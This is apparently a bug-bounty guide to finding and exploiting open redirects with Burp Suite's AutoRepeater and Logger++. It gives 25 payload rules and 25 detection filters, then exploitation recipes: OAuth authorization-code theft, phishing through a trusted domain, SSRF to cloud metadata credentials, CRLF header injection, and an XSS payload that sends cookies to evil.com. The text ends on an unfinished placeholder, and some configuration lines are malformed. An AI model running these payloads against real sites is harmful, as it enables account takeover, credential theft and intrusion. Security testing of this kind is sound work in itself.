# Finding Open Redirects with Logger++ and AutoRepeater

A practical guide for bug bounty hunters using only Burp Suite extensions.

## 🎯 Overview
This framework provides complete Open Redirect detection and exploitation using only two Burp Suite extensions:

- **AutoRepeater:** Automatically injects redirect payloads into parameters
- **Logger++:** Filters responses to identify successful redirections

Covers 25+ bypass techniques including: Scheme-relative URLs, @ symbol tricks, backslash confusion, whitelisted domain bypasses, encoding variations, and OAuth redirect_uri exploitation.

## 💡 Why This Framework?
Most bug hunters miss Open Redirect vulnerabilities because they:

- ✗ Only test basic ?redirect=https://evil.com
- ✗ Skip scheme-relative bypasses (//evil.com)
- ✗ Don't test @ symbol tricks (trusted@evil.com)
- ✗ Ignore backslash confusion (\/\/evil.com)
- ✗ Miss localhost/internal redirects
- ✗ Don't test whitelisted domain bypasses
- ✗ Skip JavaScript-based redirects
- ✗ Ignore OAuth/OIDC redirect_uri parameters
- ✗ Don't check for meta refresh redirects
- ✗ Miss CRLF injection opportunities

This framework tests 25 different redirect techniques simultaneously across all parameters.

## ⚙️ Requirements
### Burp Suite Extensions:
- **AutoRepeater** - Download from BApp Store
- **Logger++** - Download from BApp Store

### Target Indicators (High Success):
- ✓ OAuth/OIDC authentication flows (redirect_uri, callback_url)
- ✓ Logout/login pages with redirect parameters
- ✓ Parameters like: url, redirect, next, return, goto, destination, returnTo, continue
- ✓ /logout, /signin, /signout, /auth/*, /oauth/* endpoints
- ✓ Link shortener services
- ✓ External link warning pages

## 🔧 AutoRepeater Configuration Setup Instructions:
1. Open Burp Suite → Extensions → AutoRepeater.
2. Create 25 replacement rules (tabs).
3. Enable all tabs before browsing target.
4. AutoRepeater will test ALL parameters automatically.
 
### Tab Configurations:
#### Tab 1: Basic External Domain**
...
Type: Request Parameter Value  
Match: .*  
Replace: https://evil.com  
Which: Replace All  
Regex Match: Enabled  
Comment: Basic external domain redirect test.
...
 
#### Tab 2: Scheme-Relative URL**
...
Type: Request Parameter Value  
Match: .*  
dReplace: //evil.com  
dWhich: Replace All  
dRegex Match: Enabled  
dComment: Scheme-relative bypass - inherits current protocol.
...

#### Tab 3: Triple Slash
```
Type: Request Parameter Value
Match: .*
Replace: ///evil.com
Which: Replace All
Regex Match: Enabled
Comment: Triple slash bypass for filter evasion
```

#### Tab 4: Quadruple Slash
```
Type: Request Parameter Value
Match: .*
Replace: ////evil.com
Which: Replace All
Regex Match: Enabled
Comment: Quadruple slash for aggressive filters
```

#### Tab 5: @ Symbol Bypass (Userinfo)
```
Type: Request Parameter Value
Match: .*
Replace: https://trusted.com@evil.com
Which: Replace All
Regex Match:  Enabled
Comment: @ symbol trick - browser goes to evil.com, filter sees trusted.com
```

#### Tab 6: @ Symbol Without Scheme
```
Type: Request Parameter Value
Match: .*
Replace: //trusted.com@evil.com
Which: Replace All
Regex Match:  Enabled
Comment: Scheme-relative with @ symbol
```

#### Tab 7: Backslash Confusion
```
Type: Request Parameter Value
Match: .*
Replace: https://trusted.com\@evil.com
Which: Replace All
Regex Match:  Enabled
Comment: Backslash instead of forward slash - browser normalizes to /
```

#### Tab 8: Double Backslash
```
Type: Request Parameter Value
Match: .*
Replace: \\evil.com
Which: Replace All
Regex Match:  Enabled
Comment: Double backslash bypass
```

#### Tab 9: Mixed Slash + Backslash
```
Type: Request Parameter Value
Match: .*
Replace: \/\/evil.com
Which: Replace All
Regex Match:  Enabled
Comment: Forward + backslash combination
```

#### Tab 10: Reverse Slash Pattern
```
Type: Request Parameter Value
Match: .*
Replace: /\/evil.com
Which: Replace All
Regex Match:  Enabled
Comment: Slash-backslash-slash pattern
```

#### Tab 11: Whitelisted Domain Prefix
```
Type: Request Parameter Value
Match: .*
Replace: https://evil.com.trusted.com
Which: Replace All
Regex Match:  Enabled
Comment: Evil domain with trusted domain as TLD
```

#### Tab 12: Whitelisted Domain Suffix
```
Type: Request Parameter Value
Match: .*
Replace: https://trusted.com.evil.com
Which: Replace All
Regex Match:  Enabled
Comment: Trusted domain as subdomain of evil.com
```

#### Tab 13: Question Mark Bypass
```
Type: Request Parameter Value
Match: .*
Replace: https://evil.com?trusted.com
Which: Replace All
Regex Match:  Enabled
Comment: Question mark - browser treats trusted.com as query parameter
```

#### Tab 14: Hash/Fragment Bypass
```
Type: Request Parameter Value
Match: .*
Replace: https://evil.com#trusted.com
Which: Replace All
Regex Match:  Enabled
Comment: Hash symbol - browser treats trusted.com as fragment
```

#### Tab 15: Path Bypass
```
Type: Request Parameter Value
Match: .*
Replace: https://evil.com/trusted.com
Which: Replace All
Regex Match:  Enabled
Comment: Trusted domain in path component
```

#### Tab 16: URL Encoded Slash
```
Type: Request Parameter Value
Match: .*
Replace: https://evil.com%2ftrusted.com
Which: Replace All
Regex Match:  Enabled
Comment: URL encoded forward slash
```

#### Tab 17: Localhost Redirect
```
Type: Request Parameter Value
Match: .*
Replace: http://127.0.0.1
Which: Replace All
Regex Match:  Enabled
Comment: Redirect to localhost - test internal redirects
```

#### Tab 18: Localhost with Trailing Dot
```
Type: Request Parameter Value
Match: .*
Replace: http://127.0.0.1.
Which: Replace All
Regex Match:  Enabled
Comment: Trailing dot bypass for localhost filters
```

#### Tab 19: IPv6 Loopback
```
Type: Request Parameter Value
Match: .*
Replace: http://[::1]
Which: Replace All
Regex Match:  Enabled
Comment: IPv6 loopback address
```

#### Tab 20: Decimal IP
```
Type: Request Parameter Value
Match: .*
Replace: http://2130706433
Which: Replace All
Regex Match:  Enabled
Comment: Decimal representation of 127.0.0.1
```

#### Tab 21: Wildcard DNS (sslip.io)
```
Type: Request Parameter Value
Match: .*
Replace: http://127.0.0.1.sslip.io
Which: Replace All
Regex Match:  Enabled
Comment: Wildcard DNS pointing to 127.0.0.1
```

#### Tab 22: CRLF Injection
```
Type: Request Parameter Value
Match: .*
Replace: %0d%0aLocation:%20https://evil.com
Which: Replace All
Regex Match:  Enabled
Comment: CRLF injection to inject Location header
```

#### Tab 23: JavaScript Protocol
```
Type: Request Parameter Value
Match: .*
Replace: javascript:alert(document.domain)
Which: Replace All
Regex Match:  Enabled
Comment: JavaScript protocol for XSS via redirect
```

#### Tab 24: CRLF + JavaScript
```
Type: Request Parameter Value
Match: .*
Replace: java%0d%0ascript%0d%0a:alert(1)
Which: Replace All
Regex Match:  Enabled
Comment: CRLF to bypass javascript keyword filter
```

#### Tab 25: Unicode Normalization
```
Type: Request Parameter Value
Match: .*
Replace: https://evil.c℀.example.com
Which: Replace All
Regex Match:  Enabled
Comment: Unicode character that normalizes to split domains
```

---

## 🔍 Logger++ Filters

### Setup Instructions

1. Open Burp Suite → **Extensions** → **Logger++**
2. Click **"+"** to add new filter
3. Add each filter below
4. Enable filters while testing
5. Sort by filter to find successful redirects

---

### 📝 All 25 Logger++ Filters

#### Filter 1: HTTP 3xx Redirect Status
```
Response.Status >= 300 && Response.Status < 400
```
**Purpose**: Captures all HTTP redirect responses (301, 302, 303, 307, 308)

---

#### Filter 2: Location Header to External Domain
```
Response.Headers CONTAINS "Location:" 
&& Response.Headers CONTAINS "evil.com"
```
**Purpose**: Detects successful redirect to attacker domain in Location header

---

#### Filter 3: Location Header to Localhost
```
Response.Headers CONTAINS "Location:" 
&& (Response.Headers CONTAINS "127.0.0.1" 
    || Response.Headers CONTAINS "localhost")
```
**Purpose**: Detects internal redirects to localhost

---

#### Filter 4: Scheme-Relative Redirect
```
Response.Headers CONTAINS "Location: //"
&& !Response.Headers CONTAINS "Location: ///"
```
**Purpose**: Catches scheme-relative redirects (//evil.com)

---

#### Filter 5: JavaScript window.location Redirect
```
Response.Body CONTAINS "window.location"
&& Response.Body CONTAINS "evil.com"
```
**Purpose**: Detects JavaScript-based redirects to attacker domain

---

#### Filter 6: JavaScript location.href Redirect
```
Response.Body CONTAINS "location.href"
&& Response.Body CONTAINS "evil.com"
```
**Purpose**: Catches location.href assignment redirects

---

#### Filter 7: JavaScript location.replace Redirect
```
Response.Body CONTAINS "location.replace"
&& Response.Body CONTAINS "evil.com"
```
**Purpose**: Detects location.replace() redirects

---

#### Filter 8: Meta Refresh Redirect
```
Response.Body CONTAINS "<meta"
&& Response.Body CONTAINS "http-equiv"
&& Response.Body CONTAINS "refresh"
&& Response.Body CONTAINS "evil.com"
```
**Purpose**: Catches meta refresh tag redirects

---

#### Filter 9: Common Redirect Parameters
```
Request.Query CONTAINS "redirect="
|| Request.Query CONTAINS "url="
|| Request.Query CONTAINS "next="
|| Request.Query CONTAINS "return="
|| Request.Query CONTAINS "goto="
|| Request.Query CONTAINS "dest="
|| Request.Query CONTAINS "destination="
|| Request.Query CONTAINS "returnTo="
|| Request.Query CONTAINS "continue="
```
**Purpose**: Identifies requests with common redirect parameters

---

#### Filter 10: OAuth redirect_uri Parameter
```
Request.Query CONTAINS "redirect_uri="
|| Request.Query CONTAINS "callback_url="
|| Request.Query CONTAINS "return_url="
```
**Purpose**: Focuses on OAuth/OIDC flows - high value targets for account takeover

---

#### Filter 11: @ Symbol in Redirect
```
(Response.Headers CONTAINS "Location:" 
 || Response.Body CONTAINS "window.location"
 || Response.Body CONTAINS "location.href")
&& (Response.Headers CONTAINS "@" 
    || Response.Body CONTAINS "@")
```
**Purpose**: Detects @ symbol bypass attempts in redirects

---

#### Filter 12: Backslash in Redirect
```
Response.Headers CONTAINS "Location:"
&& Response.Headers CONTAINS "\\"
```
**Purpose**: Catches backslash confusion redirects

---

#### Filter 13: CRLF Injection Success
```
Request.URL CONTAINS "%0d%0a"
&& Response.Status >= 300
&& Response.Status < 400
```
**Purpose**: Detects successful CRLF injection in redirects

---

#### Filter 14: JavaScript Protocol Redirect
```
(Response.Headers CONTAINS "javascript:"
 || Response.Body CONTAINS "javascript:")
&& (Request.URL CONTAINS "redirect"
    || Request.URL CONTAINS "url"
    || Request.URL CONTAINS "next")
```
**Purpose**: Catches JavaScript protocol in redirect parameters (potential XSS)

---

#### Filter 15: Wildcard DNS Redirect
```
Response.Headers CONTAINS "Location:"
&& (Response.Headers CONTAINS "sslip.io"
    || Response.Headers CONTAINS "nip.io"
    || Response.Headers CONTAINS "localtest.me")
```
**Purpose**: Detects redirects using wildcard DNS services

---

#### Filter 16: Localhost/Internal Redirect (All Variations)
```
Response.Headers CONTAINS "Location:"
&& (Response.Headers CONTAINS "127.0.0.1"
    || Response.Headers CONTAINS "localhost"
    || Response.Headers CONTAINS "[::1]"
    || Response.Headers CONTAINS "0.0.0.0")
```
**Purpose**: Catches all localhost/loopback redirect variations

---

#### Filter 17: Decimal IP Redirect
```
Response.Headers CONTAINS "Location:"
&& Response.Headers CONTAINS "2130706433"
```
**Purpose**: Detects decimal IP representation redirects

---

#### Filter 18: Unicode Normalization Redirect
```
Response.Headers CONTAINS "Location:"
&& Response.Headers CONTAINS "℀"
```
**Purpose**: Catches Unicode character confusion in redirects

---

#### Filter 19: Whitelisted Domain Bypass
```
Response.Headers CONTAINS "Location:"
&& Response.Headers CONTAINS "evil.com"
&& Response.Headers CONTAINS "trusted.com"
```
**Purpose**: Detects whitelisted domain bypass attempts

---

#### Filter 20: Suspicious Auth/OAuth Endpoints
```
(Request.Path CONTAINS "/auth"
 || Request.Path CONTAINS "/oauth"
 || Request.Path CONTAINS "/login"
 || Request.Path CONTAINS "/logout"
 || Request.Path CONTAINS "/signin"
 || Request.Path CONTAINS "/signout")
&& Response.Status >= 300
&& Response.Status < 400
```
**Purpose**: Focuses on authentication endpoints - critical for account takeover

---

#### Filter 21: Open Redirect + XSS Combo
```
(Response.Body CONTAINS "javascript:"
 || Response.Body CONTAINS "data:text/html")
&& (Request.URL CONTAINS "redirect"
    || Request.URL CONTAINS "url"
    || Request.URL CONTAINS "next")
```
**Purpose**: Detects open redirect that can escalate to XSS

---

#### Filter 22: SVG File Upload Redirect
```
Request.Body CONTAINS "<svg"
&& Request.Body CONTAINS "onload"
&& Request.Body CONTAINS "window.location"
```
**Purpose**: Catches SVG-based redirect exploitation

---

#### Filter 23: Error Messages Revealing Validation
```
Response.Body CONTAINS "invalid"
&& Response.Body CONTAINS "redirect"
|| Response.Body CONTAINS "domain"
|| Response.Body CONTAINS "whitelist"
```
**Purpose**: Error messages reveal validation logic - helps craft bypasses

---

#### Filter 24: 200 OK with Redirect Content
```
Response.Status == 200
&& (Response.Body CONTAINS "window.location"
    || Response.Body CONTAINS "location.href"
    || Response.Body CONTAINS "<meta" && Response.Body CONTAINS "refresh")
```
**Purpose**: Catches non-standard redirects (200 OK with JavaScript/meta refresh)

---

#### Filter 25: Combined - Perfect Open Redirect Storm ⚡
```
(Response.Status >= 300 && Response.Status < 400
 || Response.Body CONTAINS "window.location"
 || Response.Body CONTAINS "location.href"
 || Response.Body CONTAINS "<meta" && Response.Body CONTAINS "refresh")
&& (Response.Headers CONTAINS "evil.com"
    || Response.Body CONTAINS "evil.com"
    || Response.Headers CONTAINS "127.0.0.1"
    || Response.Body CONTAINS "127.0.0.1")
```
**Purpose**: 🔥 **Catches ALL successful redirect indicators in one filter** - Use this for quick overview

---

## 🚀 Workflow

### Phase 1: Automated Scan (10 minutes)

1. **Enable ALL 25 AutoRepeater tabs**
2. **Browse target application thoroughly**:
   - Login/logout flows
   - OAuth/SSO authentication
   - Profile pages with "return to" links
   - External link pages
   - All forms and parameters
3. **Apply Logger++ Filter #25** (catches everything)
4. **Review positive hits**

---

### Phase 2: Manual Verification (5 minutes per finding)

For each Logger++ hit:

1.  **Note the exact URL and parameter**
2.  **Identify which AutoRepeater tab succeeded**
3.  **Verify genuine redirect** (not just reflection):
   - Check HTTP response code (301, 302, 307, 308)
   - Check `Location` header value
   - Test in browser - does it actually redirect?
4.  **Check for bypass technique used**:
   - Scheme-relative?
   - @ symbol trick?
   - Backslash confusion?
   - Whitelisted domain bypass?
5.  **Document the finding** with screenshots

---

### Phase 3: Impact Assessment (10-15 minutes)

#### Test 1: Phishing Simulation
```
Craft realistic phishing URL:
https://target.com/logout?next=https://evil-target-com.phishing.site/login
```

#### Test 2: OAuth Token Leakage
```
For OAuth flows, test redirect_uri:
https://target.com/oauth/authorize?redirect_uri=https://evil.com&client_id=xxx

If successful, authorization code/token leaks to evil.com
```

#### Test 3: Session Theft
```
Test if cookies/tokens are sent in redirect:
Check if evil.com receives Referer header with sensitive data
```

#### Test 4: CSRF Bypass
```
Use open redirect to bypass CSRF token validation:
https://target.com/redirect?url=https://target.com/change-email?email=evil@evil.com&csrf=XXX
```

---

### Phase 4: Exploitation & PoC (15-20 minutes)

1.  **Create working exploit**
2.  **Demonstrate impact** (phishing, token theft, account takeover)
3.  **Document all steps** with screenshots
4.  **Prepare bug bounty report**

---

## 🔥 Advanced Exploitation Techniques

### Technique 1: OAuth Authorization Code Theft

**Scenario**: Application uses OAuth 2.0 for authentication

**Steps**:

1. **Identify OAuth flow**:
```
https://target.com/oauth/authorize?
  client_id=xxx&
  redirect_uri=https://app.target.com/callback&
  response_type=code
```

2. **Test redirect_uri manipulation**:
```
https://target.com/oauth/authorize?
  client_id=xxx&
  redirect_uri=https://evil.com&
  response_type=code
```

3. **If successful, victim authorization code leaks to evil.com**:
```
https://evil.com?code=AUTHORIZATION_CODE&state=xxx
```

4. **Attacker exchanges code for access token** → **Account Takeover**

**Impact**: 🔴 **Critical** - Complete account takeover

---

### Technique 2: Phishing with Trusted Domain

**Scenario**: Leverage trusted domain for convincing phishing

**Steps**:

1. **Find open redirect**:
```
https://trusted-bank.com/logout?next=https://evil.com
```

2. **Create phishing page** at `evil.com` mimicking `trusted-bank.com`

3. **Distribute phishing link**:
```
https://trusted-bank.com/logout?next=https://evil-bank-phishing.com/login
```
- URL bar shows `trusted-bank.com` (before redirect)
- Victims trust the initial domain
- After logout, redirects to phishing page

**Impact**: 🟠 **High** - Credential theft via phishing

---

### Technique 3: SSRF via Open Redirect

**Scenario**: Internal services accessible via redirect

**Steps**:

1. **Test localhost redirect**:
```
?redirect=http://127.0.0.1:8080/admin
?url=http://localhost/internal-api/users
```

2. **Test cloud metadata**:
```
?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

3. **Chain with other vulnerabilities**:
```
?redirect=http://localhost:6379/  (Redis)
?redirect=http://localhost:9200/  (Elasticsearch)
```

**Impact**: 🟠 **High** - Access to internal services, potential data exfiltration

---

### Technique 4: XSS via JavaScript Protocol

**Scenario**: Application doesn't filter `javascript:` protocol

**Steps**:

1. **Test basic JavaScript**:
```
?redirect=javascript:alert(document.domain)
```

2. **If blocked, try CRLF bypass**:
```
?redirect=java%0d%0ascript%0d%0a:alert(document.domain)
```

3. **Advanced payload**:
```
?redirect=javascript://trusted.com/%0Afetch('https://evil.com?c='+document.cookie)
```

**Impact**: 🟠 **High** - XSS leading to session hijacking

---

### Technique 5: Header Injection via CRLF

**Scenario**: Open redirect vulnerable to CRLF injection

**Steps**:

1. **Test CRLF in redirect parameter**:
```
?redirect=%0d%0aSet-Cookie:%20admin=true
```

2. **Inject multiple headers**:
```
?redirect=%0d%0aSet-Cookie:%20session=hijacked%0d%0aLocation:%20https://evil.com
[Continue with remaining tabs in similar format]





